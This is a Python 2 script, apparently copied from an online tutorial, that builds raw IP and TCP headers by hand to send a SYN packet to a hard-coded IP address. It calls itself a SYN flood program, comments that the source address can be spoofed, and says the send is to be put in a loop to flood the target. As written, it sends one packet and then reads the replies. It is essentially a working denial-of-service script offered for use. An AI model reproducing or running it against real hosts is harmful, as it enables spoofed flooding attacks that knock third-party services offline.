'''
    Syn flood program in python using raw sockets (Linux)
    http://www.binarytides.com/python-syn-flood-program-raw-sockets-linux/
    Silver Moon (m00n.silv3r@gmail.com)
'''

# some imports
import socket
import sys
from struct import *

# checksum functions needed for calculation checksum


def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    #s = s + (s >> 16);
    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s


# create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error, msg:
    print 'Socket could not be created. Error Code : ' + \
        str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# now start constructing the packet
packet = ''

source_ip = '10.63.3.254'
dest_ip = '52.74.223.119'  # or socket.gethostbyname('www.google.com')

# ip header fields
ihl = 5
version = 4
tos = 0
tot_len = 20 + 20   # python seems to correctly fill the total length, dont know how ??
id = 54321  # Id of this packet
frag_off = 0
ttl = 255
protocol = socket.IPPROTO_TCP
check = 10  # python seems to correctly fill the checksum
# Spoof the source ip address if you want to
saddr = socket.inet_aton(source_ip)
daddr = socket.inet_aton(dest_ip)

ihl_version = (version << 4) + ihl

# the ! in the pack format string means network order
ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len,
                 id, frag_off, ttl, protocol, check, saddr, daddr)

# tcp header fields
source = 1234   # source port
dest = 80   # destination port
seq = 0
ack_seq = 0
doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
# tcp flags
fin = 0
syn = 1
rst = 0
psh = 0
ack = 0
urg = 0
window = socket.htons(5840)  # maximum allowed window size
check = 0
urg_ptr = 0

offset_res = (doff << 4) + 0
tcp_flags = fin + (syn << 1) + (rst << 2) + \
    (psh << 3) + (ack << 4) + (urg << 5)

# the ! in the pack format string means network order
tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq,
                  offset_res, tcp_flags,  window, check, urg_ptr)

# pseudo header fields
source_address = socket.inet_aton(source_ip)
dest_address = socket.inet_aton(dest_ip)
placeholder = 0
protocol = socket.IPPROTO_TCP
tcp_length = len(tcp_header)

psh = pack('!4s4sBBH', source_address, dest_address,
           placeholder, protocol, tcp_length)
psh = psh + tcp_header

tcp_checksum = checksum(psh)

# make the tcp header again and fill the correct checksum
tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq,
                  offset_res, tcp_flags,  window, tcp_checksum, urg_ptr)

# final full packet - syn packets dont have any data
packet = ip_header + tcp_header

# Send the packet finally - the port specified has no effect
# put this in a loop if you want to flood the target
s.settimeout(0.5)
s.sendto(packet, (dest_ip, 0))

print len(ip_header)
print len(tcp_header)

# put the above line in a loop like while 1: if you want to flood
while True:
    recvData, recvAddress = s.recvfrom(65535)

    if recvAddress[0] == dest_ip:
        print recvAddress
        print len(recvData)
        # print recvData[33]
        flags = unpack('!B', recvData[33:34])[0]
        print (flags & int('00000010', 2)) != 0
        print (flags & int('00010000', 2)) != 0

    pass
